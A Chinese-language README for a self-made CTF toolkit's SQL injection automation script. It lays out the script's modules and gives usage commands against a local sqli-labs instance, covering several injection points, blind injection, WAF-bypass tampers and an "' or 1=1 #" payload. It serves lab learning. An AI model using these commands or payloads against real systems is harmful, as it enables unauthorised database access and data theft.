# Web 安全工具箱

> 自制 CTF Web 工具集。约定结构：`<功能类别>/` 下放**可执行脚本**（入口），每个工具的同名文件夹放**源代码模块**。

## 目录结构

```
web/
├── injection/                    ← 注入类工具
│   ├── sqlinject.py              ← SQL 注入自动化（入口可执行）
│   └── sqlinject/                ← sqlinject 源码包
│       ├── cli.py                ← 参数解析与流程编排
│       ├── detector.py           ← 闭合方式识别 / 列数 / 回显位
│       ├── extractor.py          ← union 提取链（库→表→列→数据）
│       ├── blind.py              ← 布尔盲注 / 时间盲注
│       ├── bypass.py             ← WAF 绕过 tamper 集
│       └── utils.py              ← HTTP 封装与终端配色
└── （爆破、目录扫描等类别按同样规则扩展）
```

## sqlinject.py

五步方法论一键化：**确认注入 → 探测列数 → 爆库 → 爆表爆列 → 提取数据**。

```bash
cd ~/hackingtools/web/injection

# GET 整数型注入全流程
./sqlinject.py -u "http://127.0.0.1/sqli-labs/Less-2/?id=1"

# POST 登录框注入
./sqlinject.py -u "http://127.0.0.1/sqli-labs/Less-11/" -d "uname=admin&passwd=1"

# Cookie 注入
./sqlinject.py -u "http://127.0.0.1/sqli-labs/Less-20/" --cookie "uname=1" --cookie-point

# UA / Referer 注入（header 类需先满足触发条件，如登录成功）
./sqlinject.py -u "...Less-18/" -d "uname=Dhakkan&passwd=dumb" --ua-point

# 布尔 / 时间盲注
./sqlinject.py -u "...Less-5/?id=1" --blind bool
./sqlinject.py -u "...?id=1" --blind time --sleep 5

# WAF 绕过（可组合）
./sqlinject.py -u "...?id=1" --tamper space2comment,doublewrite

# 自定义 payload 单发测试
./sqlinject.py -u "...?id=1" --custom "' or 1=1 #"
```

完整参数说明：`./sqlinject.py -h`

## 使用边界

仅用于**本地靶场**（sqli-labs / DVWA / pikachu 等）与授权环境的学习实验。配套教程见 [[red_team/ctf_trea/Web/SQL/SQL总目录|SQL 注入知识库]]。
